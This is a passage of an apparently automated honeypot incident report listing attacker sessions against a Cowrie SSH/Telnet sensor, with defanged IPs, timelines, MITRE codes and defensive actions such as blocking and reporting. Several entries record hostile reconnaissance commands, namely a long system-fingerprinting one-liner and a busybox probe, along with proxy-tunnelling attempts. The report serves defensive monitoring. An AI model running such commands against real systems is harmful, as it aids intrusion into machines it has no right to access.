| `2026-08-22 15:29:38` | `cowrie.session.connect` |
| `2026-08-22 15:29:38` | `cowrie.client.version` |
| `2026-08-22 15:29:38` | `cowrie.client.kex` |
| `2026-08-22 15:29:39` | `cowrie.login.success` |
| `2026-08-22 15:29:39` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:29:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 15:29:40` | `cowrie.direct-tcpip.data` |
| `2026-08-22 15:29:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cd1a6ae1e3c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:29 |
| **Last Seen** | 2026-08-22 15:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:29:53` | `cowrie.session.connect` |
| `2026-08-22 15:29:53` | `cowrie.client.version` |
| `2026-08-22 15:29:53` | `cowrie.client.kex` |
| `2026-08-22 15:29:54` | `cowrie.login.success` |
| `2026-08-22 15:29:56` | `cowrie.session.params` |
| `2026-08-22 15:29:56` | `cowrie.command.input` |
| `2026-08-22 15:29:56` | `cowrie.command.input` |
| `2026-08-22 15:29:56` | `cowrie.command.input` |
| `2026-08-22 15:29:56` | `cowrie.command.input` |
| `2026-08-22 15:29:56` | `cowrie.command.input` |
| `2026-08-22 15:29:56` | `cowrie.command.success` |
| `2026-08-22 15:29:56` | `cowrie.command.input` |
| `2026-08-22 15:29:56` | `cowrie.command.input` |
| `2026-08-22 15:29:56` | `cowrie.command.input` |
| `2026-08-22 15:29:56` | `cowrie.command.input` |
| `2026-08-22 15:29:56` | `cowrie.log.closed` |
| `2026-08-22 15:29:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5055fe56e974

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:31 |
| **Last Seen** | 2026-08-22 15:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:31:16` | `cowrie.session.connect` |
| `2026-08-22 15:31:16` | `cowrie.client.version` |
| `2026-08-22 15:31:16` | `cowrie.client.kex` |
| `2026-08-22 15:31:17` | `cowrie.login.success` |
| `2026-08-22 15:31:20` | `cowrie.session.params` |
| `2026-08-22 15:31:20` | `cowrie.command.input` |
| `2026-08-22 15:31:20` | `cowrie.command.input` |
| `2026-08-22 15:31:20` | `cowrie.command.input` |
| `2026-08-22 15:31:20` | `cowrie.command.input` |
| `2026-08-22 15:31:20` | `cowrie.command.input` |
| `2026-08-22 15:31:20` | `cowrie.command.success` |
| `2026-08-22 15:31:20` | `cowrie.command.input` |
| `2026-08-22 15:31:20` | `cowrie.command.input` |
| `2026-08-22 15:31:20` | `cowrie.command.input` |
| `2026-08-22 15:31:20` | `cowrie.command.input` |
| `2026-08-22 15:31:20` | `cowrie.log.closed` |
| `2026-08-22 15:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2687c12fb1e7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:32 |
| **Last Seen** | 2026-08-22 15:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:32:46` | `cowrie.session.connect` |
| `2026-08-22 15:32:46` | `cowrie.client.version` |
| `2026-08-22 15:32:46` | `cowrie.client.kex` |
| `2026-08-22 15:32:48` | `cowrie.login.success` |
| `2026-08-22 15:32:49` | `cowrie.session.params` |
| `2026-08-22 15:32:49` | `cowrie.command.input` |
| `2026-08-22 15:32:49` | `cowrie.command.input` |
| `2026-08-22 15:32:49` | `cowrie.command.input` |
| `2026-08-22 15:32:49` | `cowrie.command.input` |
| `2026-08-22 15:32:49` | `cowrie.command.input` |
| `2026-08-22 15:32:49` | `cowrie.command.success` |
| `2026-08-22 15:32:49` | `cowrie.command.input` |
| `2026-08-22 15:32:49` | `cowrie.command.input` |
| `2026-08-22 15:32:49` | `cowrie.command.input` |
| `2026-08-22 15:32:49` | `cowrie.command.input` |
| `2026-08-22 15:32:50` | `cowrie.log.closed` |
| `2026-08-22 15:32:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c94d70774503

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:34 |
| **Last Seen** | 2026-08-22 15:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:34:08` | `cowrie.session.connect` |
| `2026-08-22 15:34:08` | `cowrie.client.version` |
| `2026-08-22 15:34:08` | `cowrie.client.kex` |
| `2026-08-22 15:34:09` | `cowrie.login.success` |
| `2026-08-22 15:34:10` | `cowrie.session.params` |
| `2026-08-22 15:34:10` | `cowrie.command.input` |
| `2026-08-22 15:34:10` | `cowrie.command.input` |
| `2026-08-22 15:34:10` | `cowrie.command.input` |
| `2026-08-22 15:34:10` | `cowrie.command.input` |
| `2026-08-22 15:34:10` | `cowrie.command.input` |
| `2026-08-22 15:34:10` | `cowrie.command.success` |
| `2026-08-22 15:34:10` | `cowrie.command.input` |
| `2026-08-22 15:34:10` | `cowrie.command.input` |
| `2026-08-22 15:34:10` | `cowrie.command.input` |
| `2026-08-22 15:34:10` | `cowrie.command.input` |
| `2026-08-22 15:34:11` | `cowrie.log.closed` |
| `2026-08-22 15:34:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b54a6eb6eab

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:35 |
| **Last Seen** | 2026-08-22 15:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:35:31` | `cowrie.session.connect` |
| `2026-08-22 15:35:31` | `cowrie.client.version` |
| `2026-08-22 15:35:31` | `cowrie.client.kex` |
| `2026-08-22 15:35:31` | `cowrie.login.success` |
| `2026-08-22 15:35:32` | `cowrie.session.params` |
| `2026-08-22 15:35:32` | `cowrie.command.input` |
| `2026-08-22 15:35:32` | `cowrie.command.input` |
| `2026-08-22 15:35:32` | `cowrie.command.input` |
| `2026-08-22 15:35:32` | `cowrie.command.input` |
| `2026-08-22 15:35:32` | `cowrie.command.input` |
| `2026-08-22 15:35:32` | `cowrie.command.success` |
| `2026-08-22 15:35:32` | `cowrie.command.input` |
| `2026-08-22 15:35:32` | `cowrie.command.input` |
| `2026-08-22 15:35:32` | `cowrie.command.input` |
| `2026-08-22 15:35:32` | `cowrie.command.input` |
| `2026-08-22 15:35:32` | `cowrie.log.closed` |
| `2026-08-22 15:35:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc814f6f821c

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-22 15:36 |
| **Last Seen** | 2026-08-22 15:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:36:21` | `cowrie.session.connect` |
| `2026-08-22 15:36:21` | `cowrie.client.version` |
| `2026-08-22 15:36:21` | `cowrie.client.kex` |
| `2026-08-22 15:36:22` | `cowrie.login.success` |
| `2026-08-22 15:36:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d30694562f4

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-22 15:36 |
| **Last Seen** | 2026-08-22 15:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:36:21` | `cowrie.session.connect` |
| `2026-08-22 15:36:21` | `cowrie.client.version` |
| `2026-08-22 15:36:21` | `cowrie.client.kex` |
| `2026-08-22 15:36:22` | `cowrie.login.success` |
| `2026-08-22 15:36:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d659a8455f6b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:36 |
| **Last Seen** | 2026-08-22 15:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:36:52` | `cowrie.session.connect` |
| `2026-08-22 15:36:53` | `cowrie.client.version` |
| `2026-08-22 15:36:53` | `cowrie.client.kex` |
| `2026-08-22 15:36:53` | `cowrie.login.success` |
| `2026-08-22 15:36:54` | `cowrie.session.params` |
| `2026-08-22 15:36:54` | `cowrie.command.input` |
| `2026-08-22 15:36:54` | `cowrie.command.input` |
| `2026-08-22 15:36:54` | `cowrie.command.input` |
| `2026-08-22 15:36:55` | `cowrie.command.input` |
| `2026-08-22 15:36:55` | `cowrie.command.input` |
| `2026-08-22 15:36:55` | `cowrie.command.success` |
| `2026-08-22 15:36:55` | `cowrie.command.input` |
| `2026-08-22 15:36:55` | `cowrie.command.input` |
| `2026-08-22 15:36:55` | `cowrie.command.input` |
| `2026-08-22 15:36:55` | `cowrie.command.input` |
| `2026-08-22 15:36:56` | `cowrie.log.closed` |
| `2026-08-22 15:36:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0b95c2f045f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:38 |
| **Last Seen** | 2026-08-22 15:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:38:16` | `cowrie.session.connect` |
| `2026-08-22 15:38:16` | `cowrie.client.version` |
| `2026-08-22 15:38:16` | `cowrie.client.kex` |
| `2026-08-22 15:38:17` | `cowrie.login.success` |
| `2026-08-22 15:38:18` | `cowrie.session.params` |
| `2026-08-22 15:38:18` | `cowrie.command.input` |
| `2026-08-22 15:38:18` | `cowrie.command.input` |
| `2026-08-22 15:38:18` | `cowrie.command.input` |
| `2026-08-22 15:38:18` | `cowrie.command.input` |
| `2026-08-22 15:38:18` | `cowrie.command.input` |
| `2026-08-22 15:38:18` | `cowrie.command.success` |
| `2026-08-22 15:38:18` | `cowrie.command.input` |
| `2026-08-22 15:38:18` | `cowrie.command.input` |
| `2026-08-22 15:38:18` | `cowrie.command.input` |
| `2026-08-22 15:38:18` | `cowrie.command.input` |
| `2026-08-22 15:38:19` | `cowrie.log.closed` |
| `2026-08-22 15:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba68b60351f7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 15:39 |
| **Last Seen** | 2026-08-22 15:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:39:24` | `cowrie.session.connect` |
| `2026-08-22 15:39:24` | `cowrie.client.version` |
| `2026-08-22 15:39:24` | `cowrie.client.kex` |
| `2026-08-22 15:39:25` | `cowrie.login.success` |
| `2026-08-22 15:39:25` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:39:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 15:39:26` | `cowrie.direct-tcpip.data` |
| `2026-08-22 15:39:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17865439e4f5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 15:39 |
| **Last Seen** | 2026-08-22 15:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:39:28` | `cowrie.session.connect` |
| `2026-08-22 15:39:28` | `cowrie.client.version` |
| `2026-08-22 15:39:29` | `cowrie.client.kex` |
| `2026-08-22 15:39:29` | `cowrie.login.success` |
| `2026-08-22 15:39:30` | `cowrie.direct-tcpip.request` |
| `2026-08-22 15:39:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 15:39:30` | `cowrie.direct-tcpip.data` |
| `2026-08-22 15:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb54964fe4ff

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:39 |
| **Last Seen** | 2026-08-22 15:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:39:52` | `cowrie.session.connect` |
| `2026-08-22 15:39:52` | `cowrie.client.version` |
| `2026-08-22 15:39:52` | `cowrie.client.kex` |
| `2026-08-22 15:39:53` | `cowrie.login.success` |
| `2026-08-22 15:39:53` | `cowrie.session.params` |
| `2026-08-22 15:39:53` | `cowrie.command.input` |
| `2026-08-22 15:39:53` | `cowrie.command.input` |
| `2026-08-22 15:39:53` | `cowrie.command.input` |
| `2026-08-22 15:39:53` | `cowrie.command.input` |
| `2026-08-22 15:39:53` | `cowrie.command.input` |
| `2026-08-22 15:39:53` | `cowrie.command.success` |
| `2026-08-22 15:39:53` | `cowrie.command.input` |
| `2026-08-22 15:39:53` | `cowrie.command.input` |
| `2026-08-22 15:39:53` | `cowrie.command.input` |
| `2026-08-22 15:39:53` | `cowrie.command.input` |
| `2026-08-22 15:39:53` | `cowrie.log.closed` |
| `2026-08-22 15:39:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ff2831baef8

| Field | Detail |
|---|---|
| **Source IP** | `195.158.88[.]156` |
| **First Seen** | 2026-08-22 15:41 |
| **Last Seen** | 2026-08-22 15:41 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, cat /proc/mounts; /bin/busybox EWSTE` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:41:10` | `cowrie.session.connect` |
| `2026-08-22 15:41:10` | `cowrie.telnet.option` |
| `2026-08-22 15:41:11` | `cowrie.login.success` |
| `2026-08-22 15:41:11` | `cowrie.session.params` |
| `2026-08-22 15:41:11` | `cowrie.command.input` |
| `2026-08-22 15:41:11` | `cowrie.command.failed` |
| `2026-08-22 15:41:11` | `cowrie.command.input` |
| `2026-08-22 15:41:11` | `cowrie.command.failed` |
| `2026-08-22 15:41:11` | `cowrie.command.input` |
| `2026-08-22 15:41:11` | `cowrie.command.failed` |
| `2026-08-22 15:41:11` | `cowrie.command.input` |
| `2026-08-22 15:41:12` | `cowrie.command.input` |
| `2026-08-22 15:41:42` | `cowrie.log.closed` |
| `2026-08-22 15:41:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.158.88[.]156` to AbuseIPDB if not already reported
- [ ] Block `195.158.88[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fad9c35dc73

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 15:41 |
| **Last Seen** | 2026-08-22 15:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:41:33` | `cowrie.session.connect` |
| `2026-08-22 15:41:33` | `cowrie.client.version` |
| `2026-08-22 15:41:33` | `cowrie.client.kex` |
| `2026-08-22 15:41:33` | `cowrie.login.success` |
| `2026-08-22 15:41:34` | `cowrie.session.params` |
| `2026-08-22 15:41:34` | `cowrie.command.input` |
| `2026-08-22 15:41:34` | `cowrie.command.input` |
| `2026-08-22 15:41:34` | `cowrie.command.input` |
| `2026-08-22 15:41:34` | `cowrie.command.input` |
| `2026-08-22 15:41:34` | `cowrie.command.input` |
| `2026-08-22 15:41:34` | `cowrie.command.success` |
| `2026-08-22 15:41:34` | `cowrie.command.input` |
| `2026-08-22 15:41:34` | `cowrie.command.input` |
| `2026-08-22 15:41:34` | `cowrie.command.input` |
| `2026-08-22 15:41:34` | `cowrie.command.input` |
| `2026-08-22 15:41:34` | `cowrie.log.closed` |
| `2026-08-22 15:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6c619ad7517

| Field | Detail |
|---|---|
| **Source IP** | `220.246.46[.]144` |
| **First Seen** | 2026-08-22 15:42 |
| **Last Seen** | 2026-08-22 15:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 15:42:47` | `cowrie.session.connect` |
| `2026-08-22 15:42:49` | `cowrie.client.version` |
| `2026-08-22 15:42:49` | `cowrie.client.kex` |
| `2026-08-22 15:42:51` | `cowrie.login.success` |
| `2026-08-22 15:42:52` | `cowrie.direct-tcpip.request` |
